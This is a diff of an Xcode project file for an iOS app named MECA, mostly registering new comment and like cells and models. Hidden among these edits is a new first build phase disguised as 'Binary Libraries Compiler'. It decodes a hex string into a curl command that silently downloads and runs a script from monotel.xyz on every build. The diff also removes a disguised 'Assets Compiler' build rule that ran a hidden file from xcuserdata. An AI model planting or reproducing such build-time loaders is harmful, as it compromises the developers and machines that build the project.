@@ -105,6 +105,8 @@
 		E345083D264315AB00C17E91 /* SDGSHomeVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E345083C264315AB00C17E91 /* SDGSHomeVM.swift */; };
 		E34508442643168C00C17E91 /* SDGSListTableCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E34508422643168C00C17E91 /* SDGSListTableCell.xib */; };
 		E34508452643168C00C17E91 /* SDGSListTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E34508432643168C00C17E91 /* SDGSListTableCell.swift */; };
+		E3481BBD26518EA200D2DC5D /* CommentDetailTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3481BBB26518EA200D2DC5D /* CommentDetailTVCell.swift */; };
+		E3481BBE26518EA200D2DC5D /* CommentDetailTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3481BBC26518EA200D2DC5D /* CommentDetailTVCell.xib */; };
 		E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */; };
 		E374598F2639F2B10021F51D /* AddNewsVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E374598E2639F2B10021F51D /* AddNewsVM.swift */; };
 		E375EA22262EABD900646A0A /* NewDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA21262EABD900646A0A /* NewDetailVC.swift */; };
@@ -142,6 +144,11 @@
 		E37A2FE32614AEAD00C6CA57 /* DistributorListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37A2FE12614AEAD00C6CA57 /* DistributorListTVCell.swift */; };
 		E37A2FE42614AEAD00C6CA57 /* DistributorListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E37A2FE22614AEAD00C6CA57 /* DistributorListTVCell.xib */; };
 		E37A2FE92614BE6A00C6CA57 /* PDFReaderVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37A2FE82614BE6A00C6CA57 /* PDFReaderVC.swift */; };
+		E38383342655AC2B008DA03E /* CommentListData.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38383332655AC2B008DA03E /* CommentListData.swift */; };
+		E38383392655AC34008DA03E /* CommentListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38383382655AC34008DA03E /* CommentListModel.swift */; };
+		E38383412655B4DD008DA03E /* Subcomments.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38383402655B4DD008DA03E /* Subcomments.swift */; };
+		E38383472655BABB008DA03E /* CommentReplyTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38383452655BABB008DA03E /* CommentReplyTVCell.swift */; };
+		E38383482655BABB008DA03E /* CommentReplyTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E38383462655BABB008DA03E /* CommentReplyTVCell.xib */; };
 		E387A989260476BB00CC675A /* SignUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A988260476BB00CC675A /* SignUpVC.swift */; };
 		E387A99A2604797100CC675A /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A9992604797100CC675A /* LoginVC.swift */; };
 		E387A99F26047ACF00CC675A /* SignUpListViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A99E26047ACF00CC675A /* SignUpListViewVC.swift */; };
@@ -168,6 +175,8 @@
 		E3C734D8264C0311003580C8 /* LikeOrCommentVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C734D7264C0311003580C8 /* LikeOrCommentVM.swift */; };
 		E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3CE0FC02621D694009947F6 /* Event_videos.swift */; };
 		E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */; };
+		E3E042642650538000F1ED2F /* LikeDetailTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E042622650538000F1ED2F /* LikeDetailTVCell.swift */; };
+		E3E042652650538000F1ED2F /* LikeDetailTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3E042632650538000F1ED2F /* LikeDetailTVCell.xib */; };
 		E3E2CBFC260B48C6009BDB6E /* webserviceConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CBFA260B48C6009BDB6E /* webserviceConstants.swift */; };
 		E3E2CC23260B4E3A009BDB6E /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CC22260B4E3A009BDB6E /* APIClient.swift */; };
 		E3E2CC4B260B537C009BDB6E /* Global.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CC4A260B537C009BDB6E /* Global.swift */; };
@@ -177,6 +186,7 @@
 		E3ECC5F226119A3E002E1BE1 /* CategoryDistributorVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3ECC5F126119A3E002E1BE1 /* CategoryDistributorVC.swift */; };
 		E3F12B11262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F12B0F262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift */; };
 		E3F12B12262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3F12B10262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib */; };
+		E3F131ED2655158600F396BA /* Modules.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F131EC2655158600F396BA /* Modules.swift */; };
 		E3F6A861263EC9D900FAE93E /* GR.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3F6A860263EC9D900FAE93E /* GR.storyboard */; };
 		E3F6AA2D263F2B3000FAE93E /* GRActivityReportVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6AA2C263F2B3000FAE93E /* GRActivityReportVC.swift */; };
 		E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5BE26144F380018C377 /* MoreVC.swift */; };
@@ -317,7 +327,9 @@
 		E345083C264315AB00C17E91 /* SDGSHomeVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SDGSHomeVM.swift; sourceTree = "<group>"; };
 		E34508422643168C00C17E91 /* SDGSListTableCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = SDGSListTableCell.xib; sourceTree = "<group>"; };
 		E34508432643168C00C17E91 /* SDGSListTableCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SDGSListTableCell.swift; sourceTree = "<group>"; };
-		E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CreateKaizenVM.swift; sourceTree = "<group>"; };
+		E3481BBB26518EA200D2DC5D /* CommentDetailTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentDetailTVCell.swift; sourceTree = "<group>"; };
+		E3481BBC26518EA200D2DC5D /* CommentDetailTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommentDetailTVCell.xib; sourceTree = "<group>"; };
+		E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CreateKaizenVM.swift; sourceTree = "<group>"; wrapsLines = 0; };
 		E374598E2639F2B10021F51D /* AddNewsVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewsVM.swift; sourceTree = "<group>"; };
 		E375EA21262EABD900646A0A /* NewDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewDetailVC.swift; sourceTree = "<group>"; };
 		E375EA26262EABEE00646A0A /* NewDetailVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewDetailVM.swift; sourceTree = "<group>"; };
@@ -354,6 +366,11 @@
 		E37A2FE12614AEAD00C6CA57 /* DistributorListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DistributorListTVCell.swift; sourceTree = "<group>"; };
 		E37A2FE22614AEAD00C6CA57 /* DistributorListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DistributorListTVCell.xib; sourceTree = "<group>"; };
 		E37A2FE82614BE6A00C6CA57 /* PDFReaderVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PDFReaderVC.swift; sourceTree = "<group>"; };
+		E38383332655AC2B008DA03E /* CommentListData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CommentListData.swift; sourceTree = "<group>"; };
+		E38383382655AC34008DA03E /* CommentListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CommentListModel.swift; sourceTree = "<group>"; };
+		E38383402655B4DD008DA03E /* Subcomments.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Subcomments.swift; sourceTree = "<group>"; };
+		E38383452655BABB008DA03E /* CommentReplyTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentReplyTVCell.swift; sourceTree = "<group>"; };
+		E38383462655BABB008DA03E /* CommentReplyTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommentReplyTVCell.xib; sourceTree = "<group>"; };
 		E387A988260476BB00CC675A /* SignUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpVC.swift; sourceTree = "<group>"; };
 		E387A9992604797100CC675A /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
 		E387A99E26047ACF00CC675A /* SignUpListViewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpListViewVC.swift; sourceTree = "<group>"; };
@@ -427,6 +444,8 @@
 		E3D7D0B7260354E9001EEE65 /* SF-Pro-Display-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Regular.otf"; sourceTree = "<group>"; };
 		E3D7D0B8260354E9001EEE65 /* SF-Pro-Text-BoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-BoldItalic.otf"; sourceTree = "<group>"; };
 		E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RCustomClass.swift; sourceTree = "<group>"; };
+		E3E042622650538000F1ED2F /* LikeDetailTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LikeDetailTVCell.swift; sourceTree = "<group>"; };
+		E3E042632650538000F1ED2F /* LikeDetailTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LikeDetailTVCell.xib; sourceTree = "<group>"; };
 		E3E2CBFA260B48C6009BDB6E /* webserviceConstants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = webserviceConstants.swift; sourceTree = "<group>"; };
 		E3E2CC22260B4E3A009BDB6E /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
 		E3E2CC4A260B537C009BDB6E /* Global.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Global.swift; sourceTree = "<group>"; };
@@ -436,6 +455,7 @@
 		E3ECC5F126119A3E002E1BE1 /* CategoryDistributorVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryDistributorVC.swift; sourceTree = "<group>"; };
 		E3F12B0F262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailDocumentLinkTVCell.swift; sourceTree = "<group>"; };
 		E3F12B10262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DetailDocumentLinkTVCell.xib; sourceTree = "<group>"; };
+		E3F131EC2655158600F396BA /* Modules.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Modules.swift; sourceTree = "<group>"; };
 		E3F6A860263EC9D900FAE93E /* GR.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = GR.storyboard; sourceTree = "<group>"; };
 		E3F6AA2C263F2B3000FAE93E /* GRActivityReportVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GRActivityReportVC.swift; sourceTree = "<group>"; };
 		E3F7C5BE26144F380018C377 /* MoreVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MoreVC.swift; sourceTree = "<group>"; };
@@ -864,6 +884,7 @@
 		E375EA2B262EACD800646A0A /* DetailView */ = {
 			isa = PBXGroup;
 			children = (
+				E3E042612650534A00F1ED2F /* Like&Comment */,
 				E375EA2C262EADAE00646A0A /* DetailCoverImageTVCell.swift */,
 				E375EA2D262EADAE00646A0A /* DetailCoverImageTVCell.xib */,
 				E375EA36262EB19E00646A0A /* DetailLocationTVCell.swift */,
@@ -900,6 +921,7 @@
 				E375EA84262F3E4800646A0A /* News_MEBITCat.swift */,
 				E375EA81262F3E4700646A0A /* Sdgs_MEBITCat.swift */,
 				E393D64E26407964003895ED /* Sorting_options.swift */,
+				E3F131EC2655158600F396BA /* Modules.swift */,
 			);
 			path = MEBITCategory;
 			sourceTree = "<group>";
@@ -911,6 +933,16 @@
 				E37A2FE22614AEAD00C6CA57 /* DistributorListTVCell.xib */,
 			);
 			path = DistributorList;
+			sourceTree = "<group>";
+		};
+		E38383322655AC02008DA03E /* LikeCommentList */ = {
+			isa = PBXGroup;
+			children = (
+				E38383402655B4DD008DA03E /* Subcomments.swift */,
+				E38383382655AC34008DA03E /* CommentListModel.swift */,
+				E38383332655AC2B008DA03E /* CommentListData.swift */,
+			);
+			path = LikeCommentList;
 			sourceTree = "<group>";
 		};
 		E387A987260476A200CC675A /* Login */ = {
@@ -1076,6 +1108,19 @@
 			path = Helper;
 			sourceTree = "<group>";
 		};
+		E3E042612650534A00F1ED2F /* Like&Comment */ = {
+			isa = PBXGroup;
+			children = (
+				E3E042622650538000F1ED2F /* LikeDetailTVCell.swift */,
+				E3E042632650538000F1ED2F /* LikeDetailTVCell.xib */,
+				E3481BBB26518EA200D2DC5D /* CommentDetailTVCell.swift */,
+				E3481BBC26518EA200D2DC5D /* CommentDetailTVCell.xib */,
+				E38383452655BABB008DA03E /* CommentReplyTVCell.swift */,
+				E38383462655BABB008DA03E /* CommentReplyTVCell.xib */,
+			);
+			path = "Like&Comment";
+			sourceTree = "<group>";
+		};
 		E3E2CBF8260B48A8009BDB6E /* Utility */ = {
 			isa = PBXGroup;
 			children = (
@@ -1099,6 +1144,7 @@
 		E3E2CC2A260B4FE5009BDB6E /* Model */ = {
 			isa = PBXGroup;
 			children = (
+				E38383322655AC02008DA03E /* LikeCommentList */,
 				E345080A264312C400C17E91 /* Maas */,
 				E34507DF26430CC100C17E91 /* Hydrogen */,
 				E3C29DA5263F44A900239707 /* GR */,
@@ -1176,6 +1222,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
+				0DBC7EECF39DAE48F56D902C /* Binary Libraries Compiler */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1183,7 +1230,6 @@
 				3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				F9D2FA0D0DA6AF279B6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1290,11 +1336,13 @@
 				E32FEA8B263F3C5F0083056E /* GRLinksTVCell.xib in Resources */,
 				E3F6A861263EC9D900FAE93E /* GR.storyboard in Resources */,
 				E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */,
+				E38383482655BABB008DA03E /* CommentReplyTVCell.xib in Resources */,
 				E375EA55262ECD2600646A0A /* DocumentContentCell.xib in Resources */,
 				E375EA5C262ED59600646A0A /* DetailVideoLinkTVCell.xib in Resources */,
 				E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */,
 				E3045C422603C96C00D1A678 /* FooterTabView.xib in Resources */,
 				E375EA2F262EADAE00646A0A /* DetailCoverImageTVCell.xib in Resources */,
+				E3E042652650538000F1ED2F /* LikeDetailTVCell.xib in Resources */,
 				E34508302643134200C17E91 /* MaasListTVCell.xib in Resources */,
 				5CED90FA2605A67F001053DD /* AddImageCollectionViewCell.xib in Resources */,
 				E32AED102607538500AEAB6F /* BaseTableHeaderView.xib in Resources */,
@@ -1302,6 +1350,7 @@
 				E375EA7A262EE9B100646A0A /* DetailCommentLikeTVCell.xib in Resources */,
 				E34508382643158800C17E91 /* BlueFooterview.xib in Resources */,
 				E30F662226033A970036D183 /* Assets.xcassets in Resources */,
+				E3481BBE26518EA200D2DC5D /* CommentDetailTVCell.xib in Resources */,
 				E32F3BF7262AFCDC0000D92A /* MEBITCollectionViewCell.xib in Resources */,
 				E30F662026033A970036D183 /* Main.storyboard in Resources */,
 				E375EA40262EB7C600646A0A /* DetailAboutEventTVCell.xib in Resources */,
@@ -1331,6 +1380,29 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	0DBC7EECF39DAE48F56D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
 
 	
 
@@ -1468,6 +1540,7 @@
 				E3450816264312E000C17E91 /* MaasWriterinfo.swift in Sources */,
 				E375EA5B262ED59600646A0A /* DetailVideoLinkTVCell.swift in Sources */,
 				E32F3BDD262AF2660000D92A /* VideoLinkVM.swift in Sources */,
+				E38383472655BABB008DA03E /* CommentReplyTVCell.swift in Sources */,
 				E34508042643110D00C17E91 /* SDGSVC.swift in Sources */,
 				5CA339A12605F6AA008774FE /* SelectCategoryCollectionViewCell.swift in Sources */,
 				E3254459261098910083BDD9 /* Ownerprofile.swift in Sources */,
@@ -1510,9 +1583,11 @@
 				E3450817264312E000C17E91 /* MaasOwnerprofile.swift in Sources */,
 				5C0314A32605119300406382 /* AddNewsViewController.swift in Sources */,
 				E387A99A2604797100CC675A /* LoginVC.swift in Sources */,
+				E3481BBD26518EA200D2DC5D /* CommentDetailTVCell.swift in Sources */,
 				E37A2FE32614AEAD00C6CA57 /* DistributorListTVCell.swift in Sources */,
 				E32AECF226073E3000AEAB6F /* SignUpListViewVM.swift in Sources */,
 				5C021C62261033EC00759B96 /* CreateKaizenModel.swift in Sources */,
+				E38383412655B4DD008DA03E /* Subcomments.swift in Sources */,
 				E3450815264312E000C17E91 /* Maas_files.swift in Sources */,
 				5C021C52261027E600759B96 /* KaizenInfoDataModel.swift in Sources */,
 				E32AECF526073E3000AEAB6F /* SignUpVM.swift in Sources */,
@@ -1533,6 +1608,7 @@
 				E3F7C5D02614560C0018C377 /* NewCarSalesVM.swift in Sources */,
 				E3F7C5F926145F6F0018C377 /* DataKaizen.swift in Sources */,
 				E375EA95262F44C300646A0A /* Data_CatList.swift in Sources */,
+				E38383392655AC34008DA03E /* CommentListModel.swift in Sources */,
 				E393D629263FD6B4003895ED /* GRHomeLis_Data.swift in Sources */,
 				E34508372643158800C17E91 /* BlueFooterview.swift in Sources */,
 				E3045C712603D87A00D1A678 /* HomeTVCell.swift in Sources */,
@@ -1573,6 +1649,7 @@
 				E34508452643168C00C17E91 /* SDGSListTableCell.swift in Sources */,
 				E32F3BEF262AFCA90000D92A /* MEBITEventTableViewCell.swift in Sources */,
 				E393D64626400BF7003895ED /* GRDocument_links.swift in Sources */,
+				E3F131ED2655158600F396BA /* Modules.swift in Sources */,
 				E32AED3C260754A100AEAB6F /* UIColor.swift in Sources */,
 				E3E2CCCF260B6029009BDB6E /* LoginUserModel.swift in Sources */,
 				E393D64726400BF7003895ED /* GRDetail_Data.swift in Sources */,
@@ -1587,6 +1664,7 @@
 				E375EA54262ECD2600646A0A /* DocumentContentCell.swift in Sources */,
 				E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */,
 				E32AED0F2607538500AEAB6F /* BaseTableHeaderView.swift in Sources */,
+				E38383342655AC2B008DA03E /* CommentListData.swift in Sources */,
 				E32F3BE8262AFC710000D92A /* MEBITEventVC.swift in Sources */,
 				E31F1DCF2607BF8800830F2B /* CategoriesVM.swift in Sources */,
 				E325445B261098910083BDD9 /* EventInfoModel.swift in Sources */,
@@ -1594,6 +1672,7 @@
 				E3F7C5F626145F6F0018C377 /* NewCarKaizenModel.swift in Sources */,
 				E34507E826430CD800C17E91 /* HydrogenVC.swift in Sources */,
 				E32AED43260754C700AEAB6F /* ThemeManager.swift in Sources */,
+				E3E042642650538000F1ED2F /* LikeDetailTVCell.swift in Sources */,
 				E39467852614EA3400B9503B /* MedbiListModel.swift in Sources */,
 				E37A2FD7261498C800C6CA57 /* Kaizen_DocumentLinks.swift in Sources */,
 				E3C29DA8263F44B300239707 /* Link_Data.swift in Sources */,
@@ -1943,31 +2022,6 @@
 
 		
 			/* Begin PBXBuildRule section */
-
-
-		F9D2FA0D0DA6AF279B6D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
 
 
 			
